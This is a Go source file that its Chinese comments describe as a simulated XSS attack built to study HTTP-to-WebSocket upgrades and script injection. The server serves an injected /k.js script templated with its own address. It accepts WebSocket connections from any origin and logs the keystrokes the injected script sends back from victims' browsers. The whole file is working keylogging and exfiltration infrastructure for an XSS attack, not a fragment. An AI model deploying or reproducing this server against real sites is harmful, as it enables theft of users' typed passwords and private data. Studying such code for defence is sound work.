/*
 * 模拟一个 xss 攻击，监听并收集用户的任意数据
 * 通过服务返回（注入）js 文件，js 文件中和服务建立 websocket 连接，实时发送用户键盘输入到服务器。
 *
 * 关键点：
 *   1. 返回 html 自动请求服务器 /k.js 脚本（攻击脚本）
 *   2. 服务器返回的 /k.js 脚本会在浏览器自动运行，并进行 ws 建链
 *
 * 学到：
 *   http 连接升级为 ws 连接
 *   xss 脚本注入
 */
package main

import (
	"flag"
	"fmt"
	"html/template"
	"log"
	"net/http"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
)

var (
	listenAddr string
	jsTemplate *template.Template
	upgrader   = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool { return true }, // 允许所有 Origin 的连接
	}
)

func init() {
	flag.StringVar(&listenAddr, "listen_addr", "127.0.0.1:8080", "Address and port to listen on")
	flag.Parse()

	var err error
	if jsTemplate, err = template.ParseFiles("./assets/logger.js"); err != nil {
		panic("parse logger.js failed: " + err.Error())
	}
}

func main() {
	r := mux.NewRouter()
	r.HandleFunc("/", func(rw http.ResponseWriter, r *http.Request) { // 主入口
		http.ServeFile(rw, r, "./assets/index.html")
	})
	r.HandleFunc("/ws", serveWs)        // 接收 web socket 连接
	r.HandleFunc("/k.js", serveXssFile) // 注入 js
	log.Fatal(http.ListenAndServe(listenAddr, r))
}

func serveWs(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil) // 升级 http 连接为 ws 协议
	if err != nil {
		http.Error(w, err.Error(), 500)
		return
	}
	defer conn.Close()
	remote := conn.RemoteAddr().String()
	fmt.Println("Connect from " + remote)
	for {
		_, msg, err := conn.ReadMessage() // 循环读 ws 输入（在注入的 js 中发过来）
		if err != nil {
			return
		}
		fmt.Println("From " + remote + ": " + string(msg))
	}
}

func serveXssFile(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/javascript")
	if err := jsTemplate.Execute(w, listenAddr); err != nil { // 通过模板写入服务器地址
		fmt.Println("Error exec template: " + err.Error())
	}
}
